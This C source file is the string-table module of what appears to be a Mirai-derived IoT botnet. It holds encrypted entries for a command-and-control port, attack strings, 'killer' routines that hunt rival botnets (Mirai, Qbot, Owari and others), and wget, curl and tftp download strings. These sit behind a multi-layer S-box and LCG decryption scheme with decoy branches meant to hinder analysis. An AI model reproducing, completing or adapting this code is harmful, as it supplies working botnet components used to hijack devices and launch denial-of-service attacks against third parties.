#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

static const uint8_t sbox_inv[256] = {
    0x21, 0x67, 0xD8, 0x50, 0x3B, 0x57, 0xE6, 0x6D, 0xAD, 0xA6, 0x0F, 0xFA, 0xC9, 0xD5, 0x76, 0xAF,
    0x0D, 0x2B, 0xE3, 0x6A, 0x32, 0xC8, 0x45, 0x1A, 0x85, 0xD4, 0x96, 0xCC, 0xAE, 0x22, 0x9D, 0xA0,
    0xF8, 0x39, 0xDC, 0x48, 0xF2, 0xEE, 0x93, 0x99, 0xB9, 0xBC, 0xB5, 0x86, 0x8D, 0x25, 0x41, 0x26,
    0x4F, 0x20, 0xE9, 0xF3, 0x69, 0x17, 0x42, 0x56, 0x6B, 0x1C, 0xB1, 0xE4, 0x54, 0xEC, 0xCF, 0x8E,
    0x08, 0x5D, 0xA2, 0xAB, 0x02, 0x3C, 0xCE, 0xE7, 0x2C, 0xA5, 0x4A, 0x89, 0x60, 0x23, 0xA7, 0x78,
    0xDE, 0xB2, 0x09, 0x1F, 0xA1, 0xA4, 0x04, 0xC0, 0x84, 0x70, 0x7B, 0x00, 0x4E, 0x8A, 0x15, 0xDA,
    0xE1, 0x0E, 0x73, 0xF1, 0x8C, 0xC4, 0x3A, 0x1B, 0x10, 0xE5, 0xB0, 0x98, 0xBE, 0xEB, 0x1E, 0x2E,
    0x0B, 0xAA, 0x71, 0x44, 0xAC, 0x37, 0xF5, 0xFB, 0xA8, 0x9B, 0x65, 0xBA, 0xCA, 0xDF, 0xD1, 0x6C,
    0x1D, 0xDD, 0x3E, 0x30, 0xCB, 0xD2, 0xB8, 0x40, 0x3F, 0x59, 0xB4, 0x81, 0xD7, 0x5E, 0xE0, 0x9A,
    0x6F, 0x8B, 0x87, 0xB6, 0xF7, 0x9C, 0xFC, 0x63, 0x2D, 0x7F, 0x7A, 0xA3, 0x13, 0xBF, 0xCD, 0x36,
    0xFE, 0x05, 0x4B, 0xEF, 0xE2, 0xC5, 0x58, 0x35, 0x52, 0xC1, 0x2A, 0xD9, 0x80, 0x4D, 0x16, 0x0C,
    0xC7, 0x92, 0xC3, 0x18, 0x9E, 0x51, 0xFD, 0x9F, 0x90, 0x33, 0x46, 0x14, 0x74, 0x49, 0xF4, 0x82,
    0x75, 0xF6, 0xB3, 0xBB, 0x0A, 0xA9, 0x55, 0x6E, 0xC2, 0xFF, 0x83, 0x27, 0x7E, 0x24, 0x5A, 0xD3,
    0x5C, 0x61, 0x38, 0x3D, 0x88, 0x06, 0x91, 0x03, 0xF0, 0x66, 0x29, 0xB7, 0xF9, 0x68, 0x94, 0x12,
    0x28, 0x01, 0x5F, 0x5B, 0x97, 0x95, 0x7C, 0x07, 0x11, 0x7D, 0x8F, 0xDB, 0x79, 0x72, 0xD0, 0x47,
    0x19, 0xD6, 0x77, 0xE8, 0x2F, 0xED, 0x4C, 0x31, 0x43, 0x53, 0x34, 0xEA, 0xC6, 0xBD, 0x64, 0x62
};

static const uint8_t sbox2_inv[256] = {
    0xEE, 0x58, 0x3F, 0x4D, 0x5E, 0xC3, 0x33, 0xB9, 0x63, 0x53, 0xED, 0x3E, 0xD0, 0xC9, 0xCA, 0x86,
    0x09, 0x17, 0xE3, 0xA2, 0x7B, 0xD1, 0xD5, 0x9C, 0xFC, 0x95, 0x96, 0x6A, 0xEB, 0x49, 0xAD, 0x29,
    0x16, 0x14, 0x68, 0x0A, 0x69, 0xBB, 0x84, 0xA3, 0x2D, 0x1C, 0xA9, 0x03, 0xDA, 0xE2, 0x9F, 0xAF,
    0xA8, 0x18, 0xB3, 0x61, 0xBA, 0x3D, 0x65, 0x5F, 0x62, 0xCE, 0x6E, 0x4F, 0xC1, 0xCF, 0xD2, 0xF9,
    0x57, 0x1E, 0x0D, 0x50, 0x3C, 0x2B, 0xD9, 0x88, 0xE1, 0x6B, 0x28, 0x92, 0xC6, 0x51, 0xA1, 0xDC,
    0x80, 0xFE, 0x46, 0x75, 0xAE, 0x90, 0xFA, 0x70, 0x3A, 0x5C, 0x97, 0x25, 0x94, 0xD4, 0x00, 0xEC,
    0x48, 0x38, 0x7A, 0xF7, 0xF0, 0xB7, 0x7D, 0x05, 0x2C, 0x19, 0xD7, 0x7F, 0x15, 0xDB, 0x3B, 0xBC,
    0xC8, 0xDE, 0x83, 0xB0, 0x42, 0x77, 0x5A, 0x8C, 0x6F, 0xC4, 0x2A, 0x24, 0x30, 0x52, 0xBF, 0xAA,
    0x1D, 0xD3, 0x56, 0x1F, 0x07, 0x22, 0xA5, 0x85, 0x72, 0xC2, 0x2F, 0xB5, 0x27, 0xC7, 0x13, 0xDD,
    0x9D, 0x45, 0x8A, 0xE4, 0x37, 0xE6, 0xF1, 0x8F, 0x9B, 0x36, 0x44, 0xF5, 0xD6, 0xCD, 0x67, 0x64,
    0x81, 0x04, 0xBD, 0xDF, 0xF8, 0x76, 0xB1, 0xFF, 0x7E, 0x79, 0x8B, 0x87, 0x0B, 0x40, 0x01, 0xD8,
    0xA4, 0x5B, 0x12, 0xE9, 0xCC, 0x91, 0x43, 0xEF, 0x39, 0xFD, 0x47, 0x8E, 0x21, 0xC5, 0x32, 0xA0,
    0x35, 0xB8, 0x7C, 0x93, 0xAC, 0x8D, 0x4B, 0x4A, 0x60, 0x1B, 0x9E, 0x6C, 0xE8, 0x08, 0xFB, 0x55,
    0x71, 0xCB, 0x06, 0xA6, 0x23, 0x0C, 0x2E, 0x6D, 0xE7, 0x0F, 0x59, 0x5D, 0xB6, 0xA7, 0xB4, 0x54,
    0x11, 0x78, 0xBE, 0xE0, 0x73, 0x20, 0xF6, 0xB2, 0x31, 0x0E, 0x9A, 0x4C, 0xAB, 0x4E, 0x34, 0xF2,
    0xF3, 0xEA, 0x10, 0x02, 0x98, 0xE5, 0xF4, 0x41, 0x66, 0x82, 0xC0, 0x1A, 0x89, 0x74, 0x26, 0x99
};

static uint64_t table_key;
struct table_value table[TABLE_MAX_KEYS];

static void toggle_obf_a(uint8_t);
static void toggle_obf_b(uint8_t);
static void toggle_obf_c(uint8_t);
static void toggle_obf_d(uint8_t);
static void toggle_obf_e(uint8_t);
static void add_entry(uint8_t, char *, int);
static void (*volatile toggle_ptr)(uint8_t) = NULL;

static void resolve_toggle(void)
{
    uint64_t sel = table_key;
    uint64_t check = sel ^ 0xDEADBEEFCAFEBABEull;
    if ((sel >> 40) == ((check >> 40) ^ 0xDE))
    {
        switch ((sel >> 40) & 7)
        {
            case 0: toggle_ptr = toggle_obf_a; break;
            case 1: toggle_ptr = toggle_obf_b; break;
            case 2: toggle_ptr = toggle_obf_c; break;
            case 3: toggle_ptr = toggle_obf_d; break;
            default: toggle_ptr = toggle_obf_e; break;
        }
    }
    else
    {
        if ((uintptr_t)&toggle_ptr > 0x1000)
            toggle_ptr = toggle_obf_c;
        else
            toggle_ptr = toggle_obf_c;
    }
}

static uint64_t derive_key(void)
{
    uint64_t k = 0;
    k ^= 0xA3F81C4B0D9E6A27ull;
    k = (k << 13) | (k >> 51);
    k ^= 0x1234567890ABCDEFull;
    k = (k << 7) | (k >> 57);
    k ^= 0x7B2E9C1D4F6A8E35ull;
    k = (k << 17) | (k >> 47);
    k ^= 0xD1C4E7A29B3F506Cull;
    k = (k << 23) | (k >> 41);
    k ^= 0x9E3A1F6C8B2D5A47ull;
    k = (k << 11) | (k >> 53);
    k ^= 0x4F1C8A2D6B9E37E5ull;
    k = (k << 19) | (k >> 45);
    k ^= 0x8C6D2A4F1E3B5C79ull;
    k = (k << 5) | (k >> 59);
    k ^= 0x3B7A1C5D9E2F4C68ull;
    k = (k << 29) | (k >> 35);
    k ^= 0xE2D4F6A8C0B1E3F5ull;
    return k;
}

void table_init(void)
{
    table_key = derive_key();
    resolve_toggle();
    add_entry(TABLE_CNC_PORT, "\x85\x41", 2);
    add_entry(TABLE_KILLER_PROC, "\x5E\xC6\xF2\x85\xB7\x4A", 6);
    add_entry(TABLE_KILLER_EXE, "\x6C\x11\xF0\x71\x8E", 5);
    add_entry(TABLE_KILLER_FD, "\xD3\x9B\x0D\xA8", 4);
    add_entry(TABLE_KILLER_TCP, "\xAE\xEB\x5A\xC7\x04\xD1\x6F\x82\xEF\xC2\x82\xE0\xF6\x29", 14);
    add_entry(TABLE_ATK_VSE, "\x99\xCF\xB2\x76\x90\xFB\x5C\x35\xBB\x24\x82\xEE\xE0\x67\x98\x44\x5E\x32\xAC\x51\x16", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x1A\x71\x32\x66\xF7\xDB\x65\x56\x0A\x3E\x1E\x61\xAF\x61\xF3\xE7\xED", 17);
    add_entry(TABLE_ATK_NSERV, "\x03\xDD\x95\x17\x11\x43\x3F\xC2\x03\x46\x2A\x9E", 12);
    add_entry(TABLE_KILLER_MAPS, "\x83\xF1\x1A\xB5\x1F\xE5", 6);
    add_entry(TABLE_KILLER_ANIME, "\xDC\x9C\xFA\xFD\x59\x39\x3C", 7);
    add_entry(TABLE_MEM_MIRAI, "\x8B\x28\x7C\x79\xB3\x19", 6);
    add_entry(TABLE_MEM_SORA, "\x08\x36\x85\x48\xAE", 5);
    add_entry(TABLE_MEM_OWARI, "\x3F\xCF\x28\xCF\x92\xF3", 6);
    add_entry(TABLE_MEM_JOSHO, "\x80\x70\x45\xE8\x6C\x86", 6);
    add_entry(TABLE_MEM_APOLLO, "\x23\x45\xE0\xA4\x75\x5B\x72", 7);
    add_entry(TABLE_MEM_MASUTA, "\xF4\x31\x6F\xE5\x5E\xB9\x85", 7);
    add_entry(TABLE_MEM_VAMP, "\x1C\x8C\xAB\xAC\xAE", 5);
    add_entry(TABLE_MEM_QBOT, "\xB6\x5C\x53\xC6\xC0", 5);
    add_entry(TABLE_MEM_IRC, "\x76\x03\x77\xEB", 4);
    add_entry(TABLE_MEM_SHINTO, "\xE4\x2D\xBE\x20\x59\xCC\xFC", 7);
    add_entry(TABLE_MEM_OMNI, "\x22\x6E\x02\xF6\x12", 5);
    add_entry(TABLE_MISC_WGET, "\xE0\xBC\xAC\x93\x94", 5);
    add_entry(TABLE_MISC_CURL, "\x62\x01\xBB\x86\x38", 5);
    add_entry(TABLE_MISC_TFTP, "\x73\x09\xC0\xD4\xBA", 5);
    add_entry(TABLE_MISC_REBOOT, "\x1C\x43\xF3\x78\x1A\xAA\xAB", 7);
    add_entry(TABLE_KILLER_STAT, "\x13\x2F\x5D\xD9\xBD\xA5", 6);
    add_entry(TABLE_KILLER_COMM, "\xDF\x7F\x65\x51\x95\x0D", 6);
    add_entry(TABLE_KILLER_DEVNULL, "\x96\x45\x7C\x9E\x58\x4F\x29\x4C\xB7\xC4", 10);
    add_entry(TABLE_KILLER_BUSYBOX, "\x2D\xAC\xB2\x11\x73\xA2\xD4\x7D\x7D\x28\x2C\x4A\xA1", 13);
    add_entry(TABLE_MEM_EXTRA, "\x57\xAA\xCB\x40\xCA\x36\xE9\x0C\xA8\x1D\x94\xC9\x97\x74\xB0\x66\xE3\x09\x87\x3C\x62\x9A\x33\xFF\x12\xAA\x85\x70\x9F\x17\xCC\x11\x9E\x7C\x82\x4F\xB6\xDF\xEB\x0A\x69\xAB\x79\xA4\xA9\x24\x8F\x67\x61\x0B\xD0\xF6\x5B\x1C\x96\xB8\x1D\x5C\x10\xB6\x4D\x90", 62);
}

void table_unlock_val(uint8_t id)
{
    if (toggle_ptr == NULL || id > TABLE_MAX_KEYS)
        return;
    toggle_ptr(id);
}

void table_lock_val(uint8_t id)
{
    if (toggle_ptr == NULL || id > TABLE_MAX_KEYS)
        return;
    toggle_ptr(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];
    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);
    util_memcpy(cpy, buf, buf_len);
    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
}

static uint64_t lcg_step(uint64_t s)
{
    return (s * 0x5851F42D4C957F2Dull) + 0x14057B7EF767814Full;
}

static uint32_t lcg32(uint32_t s)
{
    return (s * 1103515245) + 12345;
}

static uint32_t lcg32b(uint32_t s)
{
    return (s * 0x41C64E6D) + 0x3039;
}

static uint32_t lcg32c(uint32_t s)
{
    return (s * 0x6B8B4567) + 0x6D092B1D;
}

static uint32_t lcg32d(uint32_t s)
{
    return (s * 1103515245) + 12345;
}

static uint8_t ror8(uint8_t b, int n)
{
    n &= 7;
    return (uint8_t)((b >> n) | (b << (8 - n)));
}

static void toggle_obf_a(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint64_t s1 = table_key ^ ((uint64_t)(id + 1) * 0x1f);
    uint32_t s2 = (uint32_t)(table_key >> 32) ^ ((uint32_t)(id + 1) * 0x3d);
    uint32_t s3 = (uint32_t)(table_key >> 16) ^ ((uint32_t)(id + 1) * 0x55);
    uint32_t s4 = (uint32_t)(table_key >> 48) ^ ((uint32_t)(id + 1) * 0x7f);
    uint32_t s5 = (uint32_t)((table_key ^ (id + 1) * 0x91) >> 8);
    uintptr_t sentinel = (uintptr_t)val->val;
    if (sentinel != (uintptr_t)val->val) return;

    for (i = 0; i < val->val_len; i++)
    {
        uint8_t k1, k2, k3, b;
        s1 = lcg_step(s1);
        s2 = lcg32(s2);
        s3 = lcg32b(s3);
        s4 = lcg32c(s4);
        s5 = lcg32d(s5);
        k1 = ((s1 >> 32) ^ (s2 >> 8)) & 0xFF ^ ((uint8_t)((id * i) + (i * 0x13)));
        k2 = ((s3 >> 16) ^ (s4 >> 8)) & 0xFF ^ ((uint8_t)((id * i * 3) + (i * 0x1F)));
        k3 = ((s1 >> 16) ^ (s5 >> 16)) & 0xFF ^ ((uint8_t)((id * i * 7) + (i * 0x2D)));

        b = val->val[i];

        b = ror8(b, (i + 5) & 7);
        b = sbox_inv[b];
        b ^= k3;

        b = ror8(b, (i + 3) & 7);
        b = sbox2_inv[b];
        b ^= k2;

        b = ror8(b, (i + 1) & 7);
        b = sbox_inv[b];
        b ^= k1;

        val->val[i] = b;
        if ((uintptr_t)&k1 == (uintptr_t)&k1) { }
    }
}

static void toggle_obf_b(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint64_t s1 = table_key ^ ((uint64_t)(id + 1) * 0x1f);
    uint32_t s2 = (uint32_t)(table_key >> 32) ^ ((uint32_t)(id + 1) * 0x3d);
    uint32_t s3 = (uint32_t)(table_key >> 16) ^ ((uint32_t)(id + 1) * 0x55);
    uint32_t s4 = (uint32_t)(table_key >> 48) ^ ((uint32_t)(id + 1) * 0x7f);
    uint32_t s5 = (uint32_t)((table_key ^ (id + 1) * 0x91) >> 8);

    for (i = 0; i < val->val_len; i++)
    {
        uint8_t k1, k2, k3, b;
        s1 = lcg_step(s1);
        s2 = lcg32(s2);
        s3 = lcg32b(s3);
        s4 = lcg32c(s4);
        s5 = lcg32d(s5);
        k1 = ((s3 >> 16) ^ (s4 >> 8)) & 0xFF ^ ((uint8_t)((id * i * 3) + (i * 0x1F)));
        k2 = ((s1 >> 16) ^ (s5 >> 16)) & 0xFF ^ ((uint8_t)((id * i * 7) + (i * 0x2D)));
        k3 = ((s1 >> 32) ^ (s2 >> 8)) & 0xFF ^ ((uint8_t)((id * i) + (i * 0x13)));

        b = val->val[i];

        b = ror8(b, (i + 5) & 7);
        b = sbox_inv[b];
        b ^= k3;

        b = ror8(b, (i + 3) & 7);
        b = sbox2_inv[b];
        b ^= k2;

        b = ror8(b, (i + 1) & 7);
        b = sbox_inv[b];
        b ^= k1;

        val->val[i] = b;
    }
}

static void toggle_obf_c(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint64_t s1 = table_key ^ ((uint64_t)(id + 1) * 0x1f);
    uint32_t s2 = (uint32_t)(table_key >> 32) ^ ((uint32_t)(id + 1) * 0x3d);
    uint32_t s3 = (uint32_t)(table_key >> 16) ^ ((uint32_t)(id + 1) * 0x55);
    uint32_t s4 = (uint32_t)(table_key >> 48) ^ ((uint32_t)(id + 1) * 0x7f);
    uint32_t s5 = (uint32_t)((table_key ^ (id + 1) * 0x91) >> 8);
    uintptr_t sentinel = (uintptr_t)val->val;
    if (sentinel != (uintptr_t)val->val) return;

    for (i = 0; i < val->val_len; i++)
    {
        uint8_t k1, k2, k3, b;
        s1 = lcg_step(s1);
        s2 = lcg32(s2);
        s3 = lcg32b(s3);
        s4 = lcg32c(s4);
        s5 = lcg32d(s5);
        k1 = ((s1 >> 16) ^ (s5 >> 16)) & 0xFF ^ ((uint8_t)((id * i * 7) + (i * 0x2D)));
        k2 = ((s1 >> 32) ^ (s2 >> 8)) & 0xFF ^ ((uint8_t)((id * i) + (i * 0x13)));
        k3 = ((s3 >> 16) ^ (s4 >> 8)) & 0xFF ^ ((uint8_t)((id * i * 3) + (i * 0x1F)));

        b = val->val[i];

        b = ror8(b, (i + 5) & 7);
        b = sbox_inv[b];
        b ^= k3;

        b = ror8(b, (i + 3) & 7);
        b = sbox2_inv[b];
        b ^= k2;

        b = ror8(b, (i + 1) & 7);
        b = sbox_inv[b];
        b ^= k1;

        val->val[i] = b;
    }
}

static void toggle_obf_d(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint64_t s1 = table_key ^ ((uint64_t)(id + 1) * 0x1f);
    uint32_t s2 = (uint32_t)(table_key >> 32) ^ ((uint32_t)(id + 1) * 0x3d);
    uint32_t s3 = (uint32_t)(table_key >> 16) ^ ((uint32_t)(id + 1) * 0x55);
    uint32_t s4 = (uint32_t)(table_key >> 48) ^ ((uint32_t)(id + 1) * 0x7f);
    uint32_t s5 = (uint32_t)((table_key ^ (id + 1) * 0x91) >> 8);

    for (i = 0; i < val->val_len; i++)
    {
        uint8_t k1, k2, k3, b;
        s1 = lcg_step(s1);
        s2 = lcg32(s2);
        s3 = lcg32b(s3);
        s4 = lcg32c(s4);
        s5 = lcg32d(s5);
        k1 = ((s1 >> 32) ^ (s2 >> 8)) & 0xFF ^ ((uint8_t)((id * i) + (i * 0x13)));
        k2 = ((s1 >> 16) ^ (s5 >> 16)) & 0xFF ^ ((uint8_t)((id * i * 7) + (i * 0x2D)));
        k3 = ((s3 >> 16) ^ (s4 >> 8)) & 0xFF ^ ((uint8_t)((id * i * 3) + (i * 0x1F)));

        b = val->val[i];

        b = ror8(b, (i + 5) & 7);
        b = sbox_inv[b];
        b ^= k3;

        b = ror8(b, (i + 3) & 7);
        b = sbox2_inv[b];
        b ^= k2;

        b = ror8(b, (i + 1) & 7);
        b = sbox_inv[b];
        b ^= k1;

        val->val[i] = b;
        if ((uintptr_t)&k1 == (uintptr_t)&k1) { }
    }
}

static void toggle_obf_e(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint64_t s1 = table_key ^ ((uint64_t)(id + 1) * 0x1f);
    uint32_t s2 = (uint32_t)(table_key >> 32) ^ ((uint32_t)(id + 1) * 0x3d);
    uint32_t s3 = (uint32_t)(table_key >> 16) ^ ((uint32_t)(id + 1) * 0x55);
    uint32_t s4 = (uint32_t)(table_key >> 48) ^ ((uint32_t)(id + 1) * 0x7f);
    uint32_t s5 = (uint32_t)((table_key ^ (id + 1) * 0x91) >> 8);
    uintptr_t sentinel = (uintptr_t)val->val;
    if (sentinel != (uintptr_t)val->val) return;

    for (i = 0; i < val->val_len; i++)
    {
        uint8_t k1, k2, k3, b;
        s1 = lcg_step(s1);
        s2 = lcg32(s2);
        s3 = lcg32b(s3);
        s4 = lcg32c(s4);
        s5 = lcg32d(s5);
        k1 = ((s3 >> 16) ^ (s4 >> 8)) & 0xFF ^ ((uint8_t)((id * i * 3) + (i * 0x1F)));
        k2 = ((s1 >> 32) ^ (s2 >> 8)) & 0xFF ^ ((uint8_t)((id * i) + (i * 0x13)));
        k3 = ((s1 >> 16) ^ (s5 >> 16)) & 0xFF ^ ((uint8_t)((id * i * 7) + (i * 0x2D)));

        b = val->val[i];

        b = ror8(b, (i + 5) & 7);
        b = sbox_inv[b];
        b ^= k3;

        b = ror8(b, (i + 3) & 7);
        b = sbox2_inv[b];
        b ^= k2;

        b = ror8(b, (i + 1) & 7);
        b = sbox_inv[b];
        b ^= k1;

        val->val[i] = b;
    }
}
